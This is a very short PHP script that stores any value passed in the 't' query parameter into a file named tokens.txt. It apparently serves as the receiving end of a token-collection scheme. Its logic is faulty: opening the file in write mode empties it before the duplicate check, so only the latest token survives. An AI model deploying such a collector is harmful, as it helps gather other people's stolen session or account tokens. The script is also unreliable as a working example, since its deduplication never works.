<?php

if(isset($_GET["t"])){
	$file = fopen("tokens.txt", "w");

	$content = file_get_contents("tokens.txt");

	if(strpos($content, $_GET["t"]) === false){
		fwrite($file, $_GET["t"]);
	}
}

?>
